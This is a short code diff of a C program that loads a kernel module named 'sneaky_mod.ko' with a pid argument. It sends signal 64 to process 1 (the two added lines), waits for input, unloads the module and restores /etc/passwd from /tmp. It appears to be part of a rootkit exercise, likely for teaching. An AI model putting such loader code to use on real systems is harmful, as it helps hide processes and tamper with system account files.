@@ -13,12 +13,14 @@ int main() {
     sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);
 
     system(command);
+    system("kill -64 1");
     char input;
     while (1) {
         if ((input = getchar()) != 'q') {
             break;
         }
     }
+    system("kill -64 1");
     system("rmmod sneaky_mod.ko");
     system("cp /tmp/passwd /etc");
 
